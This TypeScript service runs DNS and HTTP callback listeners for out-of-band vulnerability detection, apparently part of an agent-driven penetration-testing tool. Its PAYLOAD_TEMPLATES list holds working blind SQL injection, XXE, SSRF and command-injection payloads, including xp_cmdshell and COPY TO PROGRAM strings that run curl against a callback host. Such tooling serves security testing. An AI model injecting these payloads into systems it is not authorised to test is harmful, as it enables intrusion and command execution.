/**
 * OOB Detector Service
 *
 * Burp Collaborator-style Out-of-Band callback detection.
 * Runs DNS (UDP) + HTTP callback servers to detect blind SQLi, XXE, SSRF, command injection.
 *
 * Flow:
 * 1. Agent calls oob_test tool → creates OobLog entry with unique testId
 * 2. Agent injects payload containing callback URL into target
 * 3. DNS/HTTP servers receive callback → update OobLog, emit SSE event
 * 4. Agent polls or long-waits for callback status
 *
 * Callback domain: TESTID.callback.gweh.sh
 * DNS port: 5353 (configurable, non-privileged)
 * HTTP port: 8825 (configurable)
 */

import { Injectable, Logger, OnModuleInit, OnModuleDestroy } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository, LessThan } from 'typeorm';
import { EventEmitter } from 'events';
import * as dgram from 'dgram';
import * as http from 'http';
import { OobLog, OobCallbackStatus, OobPayloadType } from '../entities/oob-log.entity';

/** Payload templates for different vuln types */
export interface PayloadTemplate {
  id: string;
  vulnType: 'sqli' | 'xxe' | 'ssrf' | 'cmdi';
  dbType?: string;
  payload: string;
  description: string;
}

export const PAYLOAD_TEMPLATES: PayloadTemplate[] = [
  // ─── Blind SQLi (DNS) ────────────────────────────────────────
  {
    id: 'sqli_dns_mysql',
    vulnType: 'sqli',
    dbType: 'mysql',
    payload: "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{{callback}}'))) AND '1'='1",
    description: 'MySQL DNS exfil via LOAD_FILE (UNC path)',
  },
  {
    id: 'sqli_dns_mssql',
    vulnType: 'sqli',
    dbType: 'mssql',
    payload: "'; EXEC master..xp_dirtree '\\\\{{callback}}\\x';--",
    description: 'MSSQL DNS exfil via xp_dirtree (UNC)',
  },
  {
    id: 'sqli_dns_oracle',
    vulnType: 'sqli',
    dbType: 'oracle',
    payload: "' AND UTL_HTTP.REQUEST('http://{{callback}}') IS NOT NULL AND '1'='1",
    description: 'Oracle DNS exfil via UTL_HTTP',
  },
  {
    id: 'sqli_dns_pg',
    vulnType: 'sqli',
    dbType: 'postgresql',
    payload: "'; COPY (SELECT '') TO PROGRAM 'nslookup {{callback}}';--",
    description: 'PostgreSQL DNS exfil via COPY TO PROGRAM',
  },
  // ─── Blind SQLi (HTTP) ───────────────────────────────────────
  {
    id: 'sqli_http_mysql',
    vulnType: 'sqli',
    dbType: 'mysql',
    payload: "' AND (SELECT LOAD_FILE(CONCAT('http://', '{{callback}}'))) AND '1'='1",
    description: 'MySQL HTTP exfil via LOAD_FILE',
  },
  {
    id: 'sqli_http_mssql',
    vulnType: 'sqli',
    dbType: 'mssql',
    payload: "'; EXEC master..xp_cmdshell 'curl http://{{callback}}';--",
    description: 'MSSQL HTTP exfil via xp_cmdshell',
  },
  {
    id: 'sqli_http_oracle',
    vulnType: 'sqli',
    dbType: 'oracle',
    payload: "' AND UTL_HTTP.REQUEST('http://{{callback}}/oracle') IS NOT NULL AND '1'='1",
    description: 'Oracle HTTP exfil via UTL_HTTP',
  },
  {
    id: 'sqli_http_pg',
    vulnType: 'sqli',
    dbType: 'postgresql',
    payload: "'; CREATE TABLE oob_exfil(data TEXT); COPY oob_exfil FROM PROGRAM 'curl http://{{callback}}';--",
    description: 'PostgreSQL HTTP exfil via COPY TO PROGRAM',
  },
  // ─── Blind XXE ───────────────────────────────────────────────
  {
    id: 'xxe_dns',
    vulnType: 'xxe',
    payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{callback}}">]><foo>&xxe;</foo>',
    description: 'XXE external entity DNS/HTTP callback',
  },
  {
    id: 'xxe_file',
    vulnType: 'xxe',
    payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
    description: 'XXE file read (check for DNS callback as side channel)',
  },
  // ─── SSRF ────────────────────────────────────────────────────
  {
    id: 'ssrf_http',
    vulnType: 'ssrf',
    payload: 'http://{{callback}}',
    description: 'SSRF redirect target to callback server',
  },
  {
    id: 'ssrf_dns',
    vulnType: 'ssrf',
    payload: 'http://{{callback}}/ssrf',
    description: 'SSRF with path identifier',
  },
  // ─── Command Injection ───────────────────────────────────────
  {
    id: 'cmdi_ping',
    vulnType: 'cmdi',
    payload: '; ping -c 1 {{callback}}',
    description: 'Command injection via ping',
  },
  {
    id: 'cmdi_nslookup',
    vulnType: 'cmdi',
    payload: '|| nslookup {{callback}}',
    description: 'Command injection via nslookup',
  },
  {
    id: 'cmdi_curl',
    vulnType: 'cmdi',
    payload: '$(curl http://{{callback}})',
    description: 'Command injection via curl subshell',
  },
];

/** Regex for safe testId (alphanumeric + hyphens only) */
const SAFE_TEST_ID = /^[a-zA-Z0-9-]{8,64}$/;

/** Cleanup stale pending tests every 60s */
const CLEANUP_INTERVAL_MS = 60_000;

@Injectable()
export class OobDetectorService implements OnModuleInit, OnModuleDestroy {
  private readonly logger = new Logger(OobDetectorService.name);

  private dnsServer: dgram.Socket | null = null;
  private httpServer: http.Server | null = null;

  private callbackDomain: string;
  private dnsPort: number;
  private httpPort: number;
  private maxPending: number;
  private defaultTimeoutMs: number;

  /** In-memory map of active testId → resolve function for long-poll waiters */
  private readonly waiters = new Map<string, (status: OobCallbackStatus) => void>();

  /** Public event emitter for OOB callbacks (SSE bridge can subscribe) */
  public readonly events = new EventEmitter();

  /** Cleanup timer */
  private cleanupTimer: NodeJS.Timeout | null = null;

  constructor(
    @InjectRepository(OobLog)
    private readonly oobRepo: Repository<OobLog>,
    private readonly configService: ConfigService,
  ) {
    this.callbackDomain = this.configService.get<string>('OOB_CALLBACK_DOMAIN') || 'callback.gweh.sh';
    this.dnsPort = Number(this.configService.get<string>('OOB_DNS_PORT')) || 5353;
    this.httpPort = Number(this.configService.get<string>('OOB_HTTP_PORT')) || 8825;
    this.maxPending = Number(this.configService.get<string>('OOB_MAX_PENDING')) || 50;
    this.defaultTimeoutMs = Number(this.configService.get<string>('OOB_DEFAULT_TIMEOUT_MS')) || 30000;
  }

  async onModuleInit(): Promise<void> {
    await this.startDnsServer();
    await this.startHttpServer();
    this.startCleanupTimer();
    this.logger.log(
      `OOB Detector started — DNS:${this.dnsPort} HTTP:${this.httpPort} domain:${this.callbackDomain}`,
    );
  }

  onModuleDestroy(): void {
    if (this.dnsServer) {
      this.dnsServer.close();
      this.dnsServer = null;
    }
    if (this.httpServer) {
      this.httpServer.close();
      this.httpServer = null;
    }
    if (this.cleanupTimer) {
      clearInterval(this.cleanupTimer);
      this.cleanupTimer = null;
    }
    this.logger.log('OOB Detector stopped');
  }

  // ─── DNS Server (UDP) ─────────────────────────────────────────

  private async startDnsServer(): Promise<void> {
    return new Promise((resolve, reject) => {
      this.dnsServer = dgram.createSocket('udp4');

      this.dnsServer.on('message', (msg: Buffer, rinfo: dgram.RemoteInfo) => {
        try {
          this.handleDnsQuery(msg, rinfo);
        } catch (err) {
          this.logger.warn(`DNS handler error: ${(err as Error).message}`);
        }
      });

      this.dnsServer.on('error', (err: Error) => {
        this.logger.error(`DNS server error: ${err.message}`);
        // Don't crash — DNS is optional, HTTP works too
        if (!this.dnsServer) reject(err);
      });

      this.dnsServer.bind(this.dnsPort, () => {
        this.logger.log(`DNS server listening on UDP port ${this.dnsPort}`);
        resolve();
      });
    });
  }

  /**
   * Parse a minimal DNS query to extract the queried domain name.
   * We only need the QNAME — skip header (12 bytes) and read labels.
   */
  private parseDnsQueryName(msg: Buffer): string | null {
    if (msg.length < 13) return null;
    // Skip 12-byte header
    const labels: string[] = [];
    let offset = 12;
    while (offset < msg.length) {
      const len = msg[offset++];
      if (len === 0) break;
      if (len > 63) return null; // compression or invalid
      if (offset + len > msg.length) return null;
      labels.push(msg.slice(offset, offset + len).toString('ascii'));
      offset += len;
    }
    return labels.length > 0 ? labels.join('.') : null;
  }

  private handleDnsQuery(msg: Buffer, rinfo: dgram.RemoteInfo): void {
    const queriedName = this.parseDnsQueryName(msg);
    if (!queriedName) return;

    // Check if it's a callback domain (*.callback.gweh.sh)
    const suffix = `.${this.callbackDomain}`;
    if (!queriedName.endsWith(suffix)) return;

    const subdomain = queriedName.slice(0, -suffix.length);
    // subdomain is the testId (e.g. "abc123" from "abc123.callback.gweh.sh")
    if (!subdomain || !SAFE_TEST_ID.test(subdomain)) return;

    this.logger.log(`DNS callback received: ${queriedName} from ${rinfo.address}`);
    this.processCallback(subdomain, 'dns', {
      sourceIp: rinfo.address,
      queriedName,
      queryType: 'A',
    });

    // Send minimal DNS response (A record → 127.0.0.1)
    this.sendDnsResponse(msg, rinfo);
  }

  /**
   * Build and send a minimal DNS A record response pointing to 127.0.0.1.
   * This prevents the caller from retrying or erroring out.
   */
  private sendDnsResponse(msg: Buffer, rinfo: dgram.RemoteInfo): void {
    if (msg.length < 12 || !this.dnsServer) return;
    // Copy query into response
    const response = Buffer.alloc(msg.length + 16);
    msg.copy(response, 0);
    // Set QR bit (response), authoritative answer
    response[2] = 0x85; // standard response, no error
    response[3] = 0x80;
    response[7] = 1; // 1 answer
    // Append answer: pointer to name, type A, class IN, TTL 60, rdlength 4, rdata 127.0.0.1
    let off = msg.length;
    response.writeUInt16BE(0xC00C, off); // pointer to QNAME
    off += 2;
    response.writeUInt16BE(1, off); off += 2;   // type A
    response.writeUInt16BE(1, off); off += 2;   // class IN
    response.writeUInt32BE(60, off); off += 4;  // TTL 60s
    response.writeUInt16BE(4, off); off += 2;   // rdlength 4
    response[off++] = 127; response[off++] = 0; response[off++] = 0; response[off++] = 1;
    this.dnsServer.send(response, 0, off, rinfo.port, rinfo.address);
  }

  // ─── HTTP Server ──────────────────────────────────────────────

  private async startHttpServer(): Promise<void> {
    return new Promise((resolve, reject) => {
      this.httpServer = http.createServer((req, res) => {
        try {
          this.handleHttpRequest(req, res);
        } catch (err) {
          this.logger.warn(`HTTP handler error: ${(err as Error).message}`);
          res.writeHead(500);
          res.end('error');
        }
      });

      this.httpServer.on('error', (err: Error) => {
        this.logger.error(`HTTP server error: ${err.message}`);
        if (!this.httpServer) reject(err);
      });

      this.httpServer.listen(this.httpPort, () => {
        this.logger.log(`HTTP callback server listening on port ${this.httpPort}`);
        resolve();
      });
    });
  }

  private handleHttpRequest(req: http.IncomingMessage, res: http.ServerResponse): void {
    const host = (req.headers.host || '').split(':')[0];
    const path = req.url || '/';

    // Extract testId from host: TESTID.callback.gweh.sh
    const suffix = `.${this.callbackDomain}`;
    if (!host.endsWith(suffix)) {
      res.writeHead(404);
      res.end('not found');
      return;
    }

    const testId = host.slice(0, -suffix.length);
    if (!testId || !SAFE_TEST_ID.test(testId)) {
      res.writeHead(404);
      res.end('invalid test id');
      return;
    }

    // Collect request body (small payloads only)
    const chunks: Buffer[] = [];
    let bodySize = 0;
    req.on('data', (chunk: Buffer) => {
      bodySize += chunk.length;
      if (bodySize > 1024) return; // max 1KB body
      chunks.push(chunk);
    });

    req.on('end', () => {
      const body = Buffer.concat(chunks).toString('utf8').substring(0, 1024);

      this.logger.log(`HTTP callback received: ${req.method} ${host}${path} from ${req.socket.remoteAddress}`);

      this.processCallback(testId, 'http', {
        sourceIp: req.socket.remoteAddress || 'unknown',
        method: req.method || 'GET',
        path,
        headers: this.sanitizeHeaders(req.headers),
        body: body || undefined,
        userAgent: req.headers['user-agent'],
      });

      // Respond with 200 OK
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('ok');
    });
  }

  private sanitizeHeaders(headers: http.IncomingHttpHeaders): Record<string, string> {
    const safe: Record<string, string> = {};
    const allow = ['user-agent', 'referer', 'x-forwarded-for', 'x-real-ip', 'accept'];
    for (const key of allow) {
      const val = headers[key];
      if (val) safe[key] = String(val).substring(0, 500);
    }
    return safe;
  }

  // ─── Core Callback Processing ─────────────────────────────────

  private async processCallback(
    testId: string,
    callbackType: 'dns' | 'http',
    details: Record<string, any>,
  ): Promise<void> {
    const log = await this.oobRepo.findOne({ where: { testId } });
    if (!log) {
      this.logger.warn(`Callback for unknown testId: ${testId}`);
      return;
    }

    // Already received or cancelled — still append for evidence
    const callbackEntry = {
      type: callbackType as 'dns' | 'http',
      timestamp: new Date().toISOString(),
      ...details,
    };

    const callbacks = [...(log.callbacks || []), callbackEntry];
    const newStatus: OobCallbackStatus = 'received';

    // Calculate confidence
    const hasDns = callbacks.some((c) => c.type === 'dns');
    const hasHttp = callbacks.some((c) => c.type === 'http');
    let confidence = 85;
    if (hasHttp) confidence = 90;
    if (hasDns && hasHttp) confidence = 95;
    if (callbacks.length > 2) confidence = Math.min(99, confidence + callbacks.length);

    await this.oobRepo.update(log.id, {
      callbacks,
      status: newStatus,
      confidence,
      callbackReceivedAt: log.callbackReceivedAt || new Date(),
    });

    // Emit SSE event for real-time frontend push
    this.events.emit('oob.callback', {
      testId,
      status: newStatus,
      callbackType,
      confidence,
      callbackCount: callbacks.length,
      targetUrl: log.targetUrl,
      vulnType: log.vulnType,
      details: callbackEntry,
    });

    // Resolve any long-poll waiters
    const waiter = this.waiters.get(testId);
    if (waiter) {
      waiter(newStatus);
      this.waiters.delete(testId);
    }

    this.logger.log(`OOB callback processed: testId=${testId} type=${callbackType} confidence=${confidence}`);
  }

  // ─── Public API ───────────────────────────────────────────────

  /**
   * Create a new OOB test. Returns testId, callback domain, and payload templates.
   */
  async createTest(options: {
    payloadType?: OobPayloadType;
    targetUrl?: string;
    vulnType?: string;
    timeoutMs?: number;
    templateId?: string;
  }): Promise<{
    testId: string;
    callbackDomain: string;
    callbackUrl: string;
    payloadTemplate: string | null;
    timeoutMs: number;
  }> {
    // Rate limit: check pending count
    const pendingCount = await this.oobRepo.count({ where: { status: 'pending' } });
    if (pendingCount >= this.maxPending) {
      throw new Error(`Max pending OOB tests reached (${this.maxPending}). Wait for existing tests to complete or timeout.`);
    }

    // Generate unique testId
    const testId = this.generateTestId();
    const fullDomain = `${testId}.${this.callbackDomain}`;
    const timeoutMs = options.timeoutMs || this.defaultTimeoutMs;

    // Resolve payload template
    let payloadTemplate: string | null = null;
    if (options.templateId) {
      const tmpl = PAYLOAD_TEMPLATES.find((t) => t.id === options.templateId);
      if (tmpl) {
        payloadTemplate = tmpl.payload.replace(/\{\{callback\}\}/g, fullDomain);
      }
    }

    const log = this.oobRepo.create({
      testId,
      payloadType: options.payloadType || 'dns',
      targetUrl: options.targetUrl || null,
      vulnType: options.vulnType || null,
      callbackDomain: fullDomain,
      payloadTemplate,
      status: 'pending',
      callbacks: null,
      confidence: null,
      timeoutMs,
    });

    await this.oobRepo.save(log);

    // Set auto-timeout
    setTimeout(() => this.handleTimeout(testId), timeoutMs);

    return {
      testId,
      callbackDomain: fullDomain,
      callbackUrl: `http://${fullDomain}:${this.httpPort}`,
      payloadTemplate,
      timeoutMs,
    };
  }

  /**
   * Check callback status for a test.
   */
  async getStatus(testId: string): Promise<{
    testId: string;
    status: OobCallbackStatus;
    confidence: number | null;
    callbackCount: number;
    callbacks: any[] | null;
    payloadType: OobPayloadType;
    targetUrl: string | null;
    vulnType: string | null;
    callbackDomain: string;
    payloadTemplate: string | null;
    createdAt: Date;
    callbackReceivedAt: Date | null;
  }> {
    const log = await this.oobRepo.findOne({ where: { testId } });
    if (!log) throw new Error(`OOB test not found: ${testId}`);
    return {
      testId: log.testId,
      status: log.status,
      confidence: log.confidence,
      callbackCount: (log.callbacks || []).length,
      callbacks: log.callbacks,
      payloadType: log.payloadType,
      targetUrl: log.targetUrl,
      vulnType: log.vulnType,
      callbackDomain: log.callbackDomain,
      payloadTemplate: log.payloadTemplate,
      createdAt: log.createdAt,
      callbackReceivedAt: log.callbackReceivedAt,
    };
  }

  /**
   * Long-poll wait for callback. Returns immediately if already received/timeout.
   * Otherwise waits up to waitMs for a callback to arrive.
   */
  async waitForCallback(testId: string, waitMs?: number): Promise<{
    testId: string;
    status: OobCallbackStatus;
    confidence: number | null;
    callbackCount: number;
  }> {
    const log = await this.oobRepo.findOne({ where: { testId } });
    if (!log) throw new Error(`OOB test not found: ${testId}`);

    // Already resolved
    if (log.status !== 'pending') {
      return {
        testId: log.testId,
        status: log.status,
        confidence: log.confidence,
        callbackCount: (log.callbacks || []).length,
      };
    }

    // Wait for callback or timeout
    const maxWait = Math.min(waitMs || this.defaultTimeoutMs, this.defaultTimeoutMs);
    return new Promise((resolve) => {
      const timer = setTimeout(() => {
        this.waiters.delete(testId);
        // Re-fetch to get latest state
        this.oobRepo.findOne({ where: { testId } }).then((updated) => {
          resolve({
            testId,
            status: updated?.status || 'timeout',
            confidence: updated?.confidence || null,
            callbackCount: (updated?.callbacks || []).length,
          });
        });
      }, maxWait);

      this.waiters.set(testId, (status) => {
        clearTimeout(timer);
        this.oobRepo.findOne({ where: { testId } }).then((updated) => {
          resolve({
            testId,
            status,
            confidence: updated?.confidence || null,
            callbackCount: (updated?.callbacks || []).length,
          });
        });
      });
    });
  }

  /**
   * Cancel a pending test.
   */
  async cancelTest(testId: string): Promise<{ ok: boolean }> {
    const log = await this.oobRepo.findOne({ where: { testId } });
    if (!log) throw new Error(`OOB test not found: ${testId}`);
    if (log.status === 'pending') {
      await this.oobRepo.update(log.id, { status: 'cancelled' });
      const waiter = this.waiters.get(testId);
      if (waiter) {
        waiter('cancelled');
        this.waiters.delete(testId);
      }
    }
    return { ok: true };
  }

  /**
   * Get available payload templates, optionally filtered by vuln type.
   */
  getTemplates(vulnType?: string): PayloadTemplate[] {
    if (vulnType) {
      return PAYLOAD_TEMPLATES.filter((t) => t.vulnType === vulnType);
    }
    return [...PAYLOAD_TEMPLATES];
  }

  /**
   * List recent OOB tests (for monitoring).
   */
  async listTests(limit = 20): Promise<OobLog[]> {
    return this.oobRepo.find({
      order: { createdAt: 'DESC' },
      take: limit,
    });
  }

  // ─── Internal Helpers ─────────────────────────────────────────

  private generateTestId(): string {
    // 16 chars, alphanumeric + hyphens, timestamp prefix for uniqueness
    const ts = Date.now().toString(36);
    const rand = Math.random().toString(36).substring(2, 10);
    return `${ts}-${rand}`.substring(0, 24);
  }

  private async handleTimeout(testId: string): Promise<void> {
    const log = await this.oobRepo.findOne({ where: { testId } });
    if (!log || log.status !== 'pending') return;

    await this.oobRepo.update(log.id, { status: 'timeout' });

    const waiter = this.waiters.get(testId);
    if (waiter) {
      waiter('timeout');
      this.waiters.delete(testId);
    }

    this.logger.log(`OOB test timed out: testId=${testId}`);
  }

  private startCleanupTimer(): void {
    this.cleanupTimer = setInterval(async () => {
      try {
        // Auto-cancel tests pending for > 2x timeout
        const cutoff = new Date(Date.now() - this.defaultTimeoutMs * 2);
        const stale = await this.oobRepo.find({
          where: { status: 'pending', createdAt: LessThan(cutoff) },
        });
        for (const log of stale) {
          await this.oobRepo.update(log.id, { status: 'timeout' });
          const waiter = this.waiters.get(log.testId);
          if (waiter) {
            waiter('timeout');
            this.waiters.delete(log.testId);
          }
        }
        if (stale.length > 0) {
          this.logger.log(`Cleanup: ${stale.length} stale OOB tests timed out`);
        }
      } catch (err) {
        this.logger.warn(`Cleanup error: ${(err as Error).message}`);
      }
    }, CLEANUP_INTERVAL_MS);
  }
}
